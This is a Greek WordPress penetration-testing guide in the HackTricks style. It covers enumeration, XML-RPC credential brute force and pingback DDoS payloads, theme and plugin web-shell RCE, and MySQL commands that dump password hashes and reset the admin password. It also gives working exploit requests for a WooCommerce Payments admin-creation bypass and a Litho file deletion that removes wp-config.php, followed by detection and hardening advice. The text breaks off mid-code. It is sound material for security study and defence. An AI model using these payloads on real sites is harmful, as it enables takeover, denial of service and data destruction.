# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

- **Uploaded** αρχεία πηγαίνουν στο: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Τα αρχεία θεμάτων βρίσκονται στο /wp-content/themes/,** οπότε αν αλλάξετε κάποιο php του theme για να πάρετε RCE πιθανότατα θα χρησιμοποιήσετε αυτή τη διαδρομή. Για παράδειγμα: Χρησιμοποιώντας **theme twentytwelve** μπορείτε να **προσπελάσετε** το αρχείο **404.php** στο: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Άλλη χρήσιμη διεύθυνση μπορεί να είναι:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Στο **wp-config.php** μπορείτε να βρείτε το root password της βάσης δεδομένων.
- Προεπιλεγμένες διαδρομές login προς έλεγχο: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Κύρια αρχεία WordPress**

- `index.php`
- `license.txt` περιέχει χρήσιμες πληροφορίες όπως την εγκατεστημένη έκδοση του WordPress.
- `wp-activate.php` χρησιμοποιείται για τη διαδικασία ενεργοποίησης μέσω email κατά τη ρύθμιση ενός νέου WordPress site.
- Φάκελοι login (μπορεί να μετονομαστούν για να αποκρυφθούν):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` είναι ένα αρχείο που αντιπροσωπεύει μια λειτουργία του WordPress που επιτρέπει τη μετάδοση δεδομένων με HTTP ως μεταφορικό μηχανισμό και XML ως μηχανισμό κωδικοποίησης. Αυτός ο τύπος επικοινωνίας έχει αντικατασταθεί από το WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Ο φάκελος `wp-content` είναι ο κύριος κατάλογος όπου αποθηκεύονται plugins και themes.
- `wp-content/uploads/` είναι ο κατάλογος όπου αποθηκεύονται όλα τα αρχεία που ανεβάζονται στην πλατφόρμα.
- `wp-includes/` Αυτός είναι ο κατάλογος όπου αποθηκεύονται τα core αρχεία, όπως πιστοποιητικά, γραμματοσειρές, αρχεία JavaScript και widgets.
- `wp-sitemap.xml` Στις εκδόσεις Wordpress 5.5 και νεότερες, το Wordpress δημιουργεί ένα sitemap XML αρχείο με όλα τα δημόσια posts και publicly queryable post types και taxonomies.

**Post exploitation**

- Το αρχείο `wp-config.php` περιέχει πληροφορίες που απαιτούνται από το WordPress για τη σύνδεση στη βάση δεδομένων, όπως το όνομα της βάσης δεδομένων, τον host της βάσης, username και password, authentication keys και salts, και το database table prefix. Αυτό το αρχείο ρύθμισης μπορεί επίσης να χρησιμοποιηθεί για την ενεργοποίηση της λειτουργίας DEBUG, η οποία μπορεί να είναι χρήσιμη στην αντιμετώπιση προβλημάτων.

### Δικαιώματα χρηστών

- **Administrator**
- **Editor**: Δημοσιεύει και διαχειρίζεται τις δικές του και άλλες αναρτήσεις
- **Author**: Δημοσιεύει και διαχειρίζεται τις δικές του αναρτήσεις
- **Contributor**: Γράφει και διαχειρίζεται τις αναρτήσεις του αλλά δεν μπορεί να τις δημοσιεύσει
- **Subscriber**: Περιηγείται τις αναρτήσεις και επεξεργάζεται το προφίλ του

## **Παθητική ανάκτηση πληροφοριών**

### **Βρείτε την έκδοση του WordPress**

Ελέγξτε αν μπορείτε να βρείτε τα αρχεία `/license.txt` ή `/readme.html`

Μέσα στον **πηγαίο κώδικα** της σελίδας (παράδειγμα από [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Αρχεία CSS (link)

![](<../../images/image (533).png>)

- Αρχεία JavaScript

![](<../../images/image (524).png>)

### Λήψη πρόσθετων
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Λήψη θεμάτων
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Εξαγωγή εκδόσεων γενικά
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

Πιθανότατα δεν θα καταφέρετε να βρείτε όλα τα Plugins και Themes. Για να τα ανακαλύψετε όλα, θα χρειαστεί να **actively Brute Force a list of Plugins and Themes** (ελπίζουμε ότι υπάρχουν αυτοματοποιημένα εργαλεία που περιέχουν αυτές τις λίστες).

### Users

- **ID Brute:** Παίρνετε έγκυρους χρήστες από ένα WordPress site κάνοντας Brute Forcing των user IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Εάν οι αποκρίσεις είναι **200** ή **30X**, αυτό σημαίνει ότι το id είναι **έγκυρο**. Αν η απόκριση είναι **400**, τότε το id είναι **άκυρο**.

- **wp-json:** Μπορείτε επίσης να δοκιμάσετε να λάβετε πληροφορίες για τους χρήστες ζητώντας:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Άλλο endpoint `/wp-json/` που μπορεί να αποκαλύψει κάποιες πληροφορίες για τους χρήστες είναι:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Σημειώστε ότι αυτό το endpoint αποκαλύπτει μόνο χρήστες που έχουν κάνει ένα post. **Θα παρέχονται μόνο πληροφορίες για τους χρήστες που έχουν αυτή τη λειτουργία ενεργοποιημένη**.

Επίσης σημειώστε ότι **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Όταν συνδέεστε στο **`/wp-login.php`** το **μήνυμα** είναι **διαφορετικό** ανάλογα με το αν το υποδεικνυόμενο **username** υπάρχει ή όχι.

### XML-RPC

Εάν το `xml-rpc.php` είναι ενεργό μπορείτε να πραγματοποιήσετε credentials brute-force ή να το χρησιμοποιήσετε για να εκτοξεύσετε DoS επιθέσεις σε άλλους πόρους. (Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία[ using this](https://github.com/relarizky/wpxploit) για παράδειγμα).

Για να δείτε αν είναι ενεργό δοκιμάστε να αποκτήσετε πρόσβαση στο _**/xmlrpc.php**_ και να στείλετε αυτό το αίτημα:

**Έλεγχος**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ή **`metaWeblog.getUsersBlogs`** είναι μερικές από τις μεθόδους που μπορούν να χρησιμοποιηθούν για brute-force credentials. Αν βρείτε κάποια από αυτές, μπορείτε να στείλετε κάτι όπως:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Το μήνυμα _"Incorrect username or password"_ μέσα σε μια 200 response πρέπει να εμφανίζεται εάν τα credentials δεν είναι έγκυρα.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Χρησιμοποιώντας τα σωστά credentials μπορείτε να ανεβάσετε ένα αρχείο. Στην response θα εμφανίζεται το path ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Επιπλέον υπάρχει ένας **πιο γρήγορος τρόπος** για brute-force των διαπιστευτηρίων χρησιμοποιώντας **`system.multicall`**, καθώς μπορείτε να δοκιμάσετε αρκετά διαπιστευτήρια στην ίδια αίτηση:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Παράκαμψη 2FA**

Αυτός ο μηχανισμός προορίζεται για προγράμματα και όχι για ανθρώπους, και είναι παλιός, επομένως δεν υποστηρίζει 2FA. Έτσι, αν έχετε έγκυρα διαπιστευτήρια αλλά η κύρια είσοδος προστατεύεται από 2FA, **μπορεί να καταφέρετε να καταχραστείτε το xmlrpc.php για να συνδεθείτε με αυτά τα διαπιστευτήρια παρακάμπτοντας το 2FA**. Σημειώστε ότι δεν θα μπορείτε να εκτελέσετε όλες τις ενέργειες που μπορείτε να κάνετε μέσω της κονσόλας, αλλά μπορεί να καταφέρετε να φτάσετε σε RCE όπως το εξηγεί ο Ippsec στο [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ή port scanning**

Αν μπορείτε να βρείτε τη μέθοδο _**pingback.ping**_ μέσα στη λίστα, μπορείτε να κάνετε το Wordpress να στείλει ένα αυθαίρετο αίτημα σε οποιοδήποτε host/port.\
Αυτό μπορεί να χρησιμοποιηθεί για να ζητήσετε από **χιλιάδες** **Wordpress** **sites** να **προσπελάσουν** μία **τοποθεσία** (οπότε προκαλείται **DDoS** στην εν λόγω τοποθεσία) ή μπορείτε να το χρησιμοποιήσετε για να κάνετε το **Wordpress** να **σκανάρει** κάποιο εσωτερικό **δίκτυο** (μπορείτε να καθορίσετε οποιαδήποτε port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Αν λάβετε **faultCode** με τιμή **μεγαλύτερη** από **0** (17), σημαίνει ότι η θύρα είναι ανοιχτή.

Ρίξτε μια ματιά στη χρήση του **`system.multicall`** στην προηγούμενη ενότητα για να μάθετε πώς να καταχραστείτε αυτή τη μέθοδο για να προκαλέσετε DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Αυτό το αρχείο υπάρχει συνήθως στη ρίζα του Wordpress site: **`/wp-cron.php`**\
Όταν αυτό το αρχείο **προσπελαστεί** εκτελείται μία "**heavy**" MySQL **query**, οπότε μπορεί να χρησιμοποιηθεί από **attackers** για να **προκαλέσουν** ένα **DoS**.\
Επίσης, από προεπιλογή, το `wp-cron.php` καλείται σε κάθε φόρτωση σελίδας (κάθε φορά που ένας client ζητά οποιαδήποτε σελίδα Wordpress), κάτι που σε sites με υψηλή κίνηση μπορεί να προκαλέσει προβλήματα (DoS).

Συνιστάται να απενεργοποιήσετε το Wp-Cron και να δημιουργήσετε ένα πραγματικό cronjob στον host που θα εκτελεί τις απαραίτητες ενέργειες σε τακτά διαστήματα (χωρίς να προκαλεί προβλήματα).

### /wp-json/oembed/1.0/proxy - SSRF

Δοκιμάστε να προσπελάσετε _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ και η Worpress site μπορεί να κάνει ένα request προς εσάς.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Αυτό το εργαλείο ελέγχει αν υπάρχει το **methodName: pingback.ping** και το path **/wp-json/oembed/1.0/proxy**, και αν υπάρχουν, προσπαθεί να τα εκμεταλλευτεί.

## Αυτόματα Εργαλεία
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Απόκτηση πρόσβασης αντικαθιστώντας ένα bit

Περισσότερο παρά μια πραγματική επίθεση, πρόκειται για μια περιέργεια. Στο CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) μπορούσες να αναστρέψεις 1 bit σε οποιοδήποτε αρχείο WordPress. Έτσι μπορούσες να αλλάξεις τη θέση `5389` του αρχείου `/var/www/html/wp-includes/user.php` για να κάνεις NOP τη λειτουργία NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Τροποποίηση ενός php από το χρησιμοποιούμενο θέμα (απαιτούνται διαπιστευτήρια διαχειριστή)**

Εμφάνιση → Theme Editor → 404 Template (στα δεξιά)

Αλλάξτε το περιεχόμενο σε ένα php shell:

![](<../../images/image (384).png>)

Αναζητήστε στο διαδίκτυο πώς μπορείτε να αποκτήσετε πρόσβαση σε αυτή την ενημερωμένη σελίδα. Σε αυτή την περίπτωση πρέπει να αποκτήσετε πρόσβαση εδώ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Μπορείτε να χρησιμοποιήσετε:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
για να αποκτήσετε session.

## Plugin RCE

### PHP plugin

Ενδέχεται να είναι δυνατό να ανεβάσετε αρχεία .php ως plugin.\
Δημιουργήστε το PHP backdoor σας χρησιμοποιώντας για παράδειγμα:

![](<../../images/image (183).png>)

Στη συνέχεια προσθέστε ένα νέο plugin:

![](<../../images/image (722).png>)

Ανεβάστε το plugin και πατήστε Install Now:

![](<../../images/image (249).png>)

Κάντε κλικ στο Procced:

![](<../../images/image (70).png>)

Πιθανώς αυτό δεν θα κάνει τίποτα προφανώς, αλλά αν πάτε στο Media, θα δείτε το shell σας να έχει ανέβει:

![](<../../images/image (462).png>)

Πρόσβασή σε αυτό και θα δείτε το URL για να εκτελέσετε το reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Αυτή η μέθοδος περιλαμβάνει την εγκατάσταση ενός κακόβουλου plugin που είναι γνωστό ότι έχει ευπάθεια και μπορεί να εκμεταλλευτεί για να αποκτήσει web shell. Η διαδικασία εκτελείται μέσω του WordPress dashboard ως εξής:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Once the plugin is successfully installed, it must be activated through the dashboard.
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

Το περιεχόμενο περιλαμβάνει οπτικά βοηθήματα που δείχνουν τα βήματα στο WordPress dashboard για την εγκατάσταση και ενεργοποίηση του plugin. Ωστόσο, είναι σημαντικό να σημειωθεί ότι η εκμετάλλευση ευπαθειών με αυτόν τον τρόπο είναι παράνομη και ανήθικη χωρίς κατάλληλη εξουσιοδότηση. Αυτές οι πληροφορίες θα πρέπει να χρησιμοποιούνται υπεύθυνα και μόνο σε νομικό πλαίσιο, όπως σε penetration testing με ρητή άδεια.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Από XSS σε RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ είναι ένα script σχεδιασμένο να κλιμακώνει μια ευπάθεια **Cross-Site Scripting (XSS)** σε **Remote Code Execution (RCE)** ή άλλες κρίσιμες ευπάθειες στο WordPress. Για περισσότερες πληροφορίες δείτε [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Παρέχει **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

Εξαγωγή ονομάτων χρηστών και κωδικών πρόσβασης:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Αλλαγή κωδικού admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Επιφάνεια Επίθεσης

Η γνώση του πώς ένα Wordpress plugin μπορεί να εκθέσει λειτουργικότητα είναι κρίσιμη για να εντοπιστούν ευπάθειες στη λειτουργία του. Μπορείτε να δείτε με ποιους τρόπους ένα plugin μπορεί να εκθέσει λειτουργίες στα παρακάτω σημεία και μερικά παραδείγματα ευάλωτων plugins στο [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Ένας από τους τρόπους με τους οποίους ένα plugin μπορεί να εκθέσει functions σε χρήστες είναι μέσω AJAX handlers. Αυτά μπορεί να περιέχουν λογικά σφάλματα, προβλήματα authorization ή authentication. Επιπλέον, είναι αρκετά συχνό αυτά τα functions να βασίζουν τόσο την authentication όσο και την authorization στην ύπαρξη ενός Wordpress nonce που **οποιοσδήποτε χρήστης authenticated στην Wordpress instance μπορεί να έχει** (ανεξαρτήτως ρόλου).

Αυτές είναι οι functions που μπορούν να χρησιμοποιηθούν για να εκθέσουν μια function σε ένα plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Η χρήση του `nopriv` καθιστά το endpoint προσβάσιμο από οποιουσδήποτε χρήστες (ακόμα και μη unathenticated).**

> [!CAUTION]
> Επιπλέον, αν η συνάρτηση απλώς ελέγχει την εξουσιοδότηση του χρήστη με τη συνάρτηση `wp_verify_nonce`, αυτή η συνάρτηση απλώς ελέγχει ότι ο χρήστης είναι loggedin, συνήθως δεν ελέγχει τον ρόλο του χρήστη. Έτσι, χρήστες με χαμηλά προνόμια μπορεί να έχουν πρόσβαση σε ενέργειες με υψηλότερα προνόμια.

- **REST API**

Είναι επίσης δυνατό να εκθέσετε συναρτήσεις από το wordpress καταχωρίζοντας ένα REST API χρησιμοποιώντας τη συνάρτηση `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` είναι μια callback συνάρτηση που ελέγχει αν ένας συγκεκριμένος χρήστης έχει εξουσιοδότηση να καλέσει τη μέθοδο του API.

**Αν χρησιμοποιηθεί η ενσωματωμένη συνάρτηση `__return_true`, θα παρακάμψει απλά τον έλεγχο δικαιωμάτων χρήστη.**

- **Άμεση πρόσβαση στο php αρχείο**

Φυσικά, το Wordpress χρησιμοποιεί PHP και τα αρχεία μέσα σε plugins είναι άμεσα προσβάσιμα από το web. Έτσι, αν ένα plugin εκθέτει κάποια ευπαθή λειτουργία που ενεργοποιείται απλώς με την πρόσβαση στο αρχείο, θα μπορεί να εκμεταλλευτείται από οποιονδήποτε χρήστη.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Μερικά plugins υλοποιούν “trusted header” συντομεύσεις για εσωτερικές ενσωματώσεις ή reverse proxies και στη συνέχεια χρησιμοποιούν αυτήν την επικεφαλίδα για να ορίσουν το τρέχον context χρήστη για αιτήματα REST. Εάν η επικεφαλίδα δεν είναι κρυπτογραφικά δεμένη με το αίτημα από κάποιο upstream component, ένας επιτιθέμενος μπορεί να την πλαστογραφήσει και να προσπελάσει προνομιακές REST routes ως διαχειριστής.

- Επίπτωση: μη-επιβεβαιωμένη αναβάθμιση προνομίων σε διαχειριστή δημιουργώντας έναν νέο διαχειριστή μέσω της core users REST route.
- Παράδειγμα επικεφαλίδας: `X-Wcpay-Platform-Checkout-User: 1` (εξαναγκάζει το user ID 1, που συνήθως είναι ο πρώτος λογαριασμός διαχειριστή).
- Εκμεταλλευόμενη διαδρομή: `POST /wp-json/wp/v2/users` με ένα array ρόλων με αυξημένα προνόμια.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Γιατί λειτουργεί

- Το plugin αντιστοιχίζει ένα header που ελέγχεται από τον client στην κατάσταση επαλήθευσης ταυτότητας και παρακάμπτει τους ελέγχους capability.
- Το WordPress core αναμένει την capability `create_users` για αυτό το route· το hack του plugin το παρακάμπτει με το να ορίσει απευθείας το current user context από το header.

Αναμενόμενοι δείκτες επιτυχίας

- HTTP 201 με σώμα JSON που περιγράφει τον δημιουργημένο χρήστη.
- Ένας νέος χρήστης admin ορατός στο `wp-admin/users.php`.

Λίστα ελέγχου ανίχνευσης

- Χρησιμοποιήστε grep για `getallheaders()`, `$_SERVER['HTTP_...']`, ή vendor SDKs που διαβάζουν custom headers για να ορίσουν user context (π.χ., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Επανεξετάστε τις εγγραφές REST για privileged callbacks που δεν έχουν ισχυρούς ελέγχους `permission_callback` και αντίθετα βασίζονται σε request headers.
- Αναζητήστε χρήσεις των core user-management functions (`wp_insert_user`, `wp_create_user`) μέσα σε REST handlers που προστατεύονται μόνο από τιμές header.

Σκληροποίηση

- Μην εξάγετε την επαλήθευση ταυτότητας ή την εξουσιοδότηση από headers που ελέγχονται από τον client.
- Αν ένας reverse proxy πρέπει να εγχύσει identity, τερματίστε την εμπιστοσύνη στο proxy και αφαιρέστε τις εισερχόμενες αντιγραφές (π.χ., `unset X-Wcpay-Platform-Checkout-User` στο edge), και στη συνέχεια περάστε ένα signed token και επαληθεύστε το server-side.
- Για REST routes που εκτελούν privileged actions, απαιτήστε ελέγχους `current_user_can()` και ένα αυστηρό `permission_callback` (μην χρησιμοποιείτε `__return_true`).
- Προτιμήστε first-party auth (cookies, application passwords, OAuth) αντί για header “impersonation”.

Αναφορές: δείτε τα links στο τέλος αυτής της σελίδας για ένα δημόσιο περιστατικό και ευρύτερη ανάλυση.

### Μη αυθεντικοποιημένη Αυθαίρετη Διαγραφή Αρχείου μέσω wp_ajax_nopriv (Litho Theme <= 3.0)

Τα WordPress themes και plugins συχνά εκθέτουν AJAX handlers μέσω των hooks `wp_ajax_` και `wp_ajax_nopriv_`. Όταν η παραλλαγή **_nopriv_** χρησιμοποιείται **η callback γίνεται προσβάσιμη από μη αυθεντικοποιημένους επισκέπτες**, οπότε οποιαδήποτε ευαίσθητη ενέργεια πρέπει επιπλέον να υλοποιεί:

1. Έναν **έλεγχο capability** (π.χ. `current_user_can()` ή τουλάχιστον `is_user_logged_in()`), και
2. Ένα **CSRF nonce** επικυρωμένο με `check_ajax_referer()` / `wp_verify_nonce()`, και
3. **Αυστηρή εξυγίανση / επικύρωση εισροών**.

Το multipurpose theme Litho (< 3.1) ξέχασε αυτούς τους 3 ελέγχους στη λειτουργία *Remove Font Family* και τελικά περιέλαβε τον ακόλουθο κώδικα (απλοποιημένο):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Προβλήματα που εισάγει αυτό το απόσπασμα:

* **Unauthenticated access** – το `wp_ajax_nopriv_` hook έχει καταχωρηθεί.
* **No nonce / capability check** – οποιοσδήποτε επισκέπτης μπορεί να καλέσει το endpoint.
* **No path sanitisation** – η συμβολοσειρά `fontfamily`, που ελέγχεται από τον χρήστη, συγχωνεύεται σε μια διαδρομή συστήματος αρχείων χωρίς φιλτράρισμα, επιτρέποντας το κλασικό `../../` traversal.

#### Εκμετάλλευση

Ένας επιτιθέμενος μπορεί να διαγράψει οποιοδήποτε αρχείο ή κατάλογο **κάτω από τον βασικό κατάλογο uploads** (συνήθως `<wp-root>/wp-content/uploads/`) με την αποστολή ενός μόνο HTTP POST αιτήματος:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Εφόσον `wp-config.php` βρίσκεται έξω από το *uploads*, τέσσερις ακολουθίες `../` είναι αρκετές σε μια προεπιλεγμένη εγκατάσταση. Η διαγραφή του `wp-config.php` αναγκάζει το WordPress να μπει στον *installation wizard* στην επόμενη επίσκεψη, επιτρέποντας πλήρη κατάληψη του site (ο attacker απλώς παρέχει μια νέα DB configuration και δημιουργεί έναν admin χρήστη).

Άλλοι σημαντικοί στόχοι περιλαμβάνουν plugin/theme `.php` αρχεία (για να σπάσουν security plugins) ή κανόνες `.htaccess`.

#### Detection checklist

* Οποιοδήποτε `add_action( 'wp_ajax_nopriv_...')` callback που καλεί filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, κ.λπ.).
* Συνένωση μη-ελεγχόμενης εισόδου χρήστη σε διαδρομές (ψάξτε για `$_POST`, `$_GET`, `$_REQUEST`).
* Απουσία των `check_ajax_referer()` και `current_user_can()`/`is_user_logged_in()`.

#### Σκληροποίηση
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Πάντα** αντιμετωπίζετε οποιαδήποτε εγγραφή/διαγραφή σε δίσκο ως λειτουργία με προνόμια και επαληθεύστε διπλά:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation μέσω επαναφοράς παρωχημένου ρόλου και έλλειψης εξουσιοδότησης (ASE "View Admin as Role")

Πολλά plugins υλοποιούν μια λειτουργία "view as role" ή προσωρινής εναλλαγής ρόλου αποθηκεύοντας τον/τους αρχικό(ούς) ρόλο(ους) στα user meta ώστε να μπορούν να επαναφερθούν αργότερα. Αν η διαδρομή επαναφοράς βασίζεται μόνο σε request parameters (π.χ. `$_REQUEST['reset-for']`) και σε μια λίστα που διαχειρίζεται το plugin χωρίς έλεγχο των capabilities και ενός έγκυρου nonce, αυτό μετατρέπεται σε vertical privilege escalation.

Ένα πραγματικό παράδειγμα βρέθηκε στο Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). Το reset branch επαναέφερε ρόλους βάσει `reset-for=<username>` εάν το username εμφανιζόταν σε έναν εσωτερικό πίνακα `$options['viewing_admin_as_role_are']`, αλλά δεν εκτελούσε ούτε έλεγχο `current_user_can()` ούτε επαλήθευση nonce πριν αφαιρέσει τους τρέχοντες ρόλους και προσθέσει ξανά τους αποθηκευμένους ρόλους από το user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
